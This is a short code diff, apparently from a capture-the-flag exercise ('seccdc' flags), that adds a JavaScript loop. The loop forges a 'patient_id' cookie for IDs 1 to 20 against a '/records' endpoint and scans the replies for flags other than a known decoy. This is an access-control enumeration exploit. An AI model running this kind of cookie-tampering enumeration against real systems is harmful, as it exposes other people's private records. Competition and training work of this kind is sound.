@@ -27,3 +27,21 @@ for (let i = 1; i <= 10; i++) {
       }
     });
 }
+
+for (let i = 1; i <= 20; i++) {
+  fetch("/records", { headers: { "cookie": "patient_id=" + i } })
+    .then(res => res.text())
+    .then(text => {
+      // Look for any flag that IS NOT the one we just tried
+      const flags = text.match(/seccdc\{.*?\}/g);
+      if (flags) {
+        flags.forEach(f => {
+          if (f !== "seccdc{N5M6gqe3Nk5Z}") {
+            console.log(`%c NEW FLAG FOUND IN ID ${i}: ${f}`, "color: white; background: red; font-weight: bold;");
+          } else {
+            console.log(`ID ${i} has the decoy flag.`);
+          }
+        });
+      }
+    });
+}
